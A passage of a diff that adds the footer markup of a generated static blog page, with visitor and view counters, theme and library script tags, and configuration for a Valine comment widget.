+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="Total Visitors">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="Total Views">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+
+
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function (item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '3awIpSk2hfHaeA1glDs5NtYG-gzGzoHsz',
+    appKey: '6ORiR0zVaYi0ljkwUfSn0aWG',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+</script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
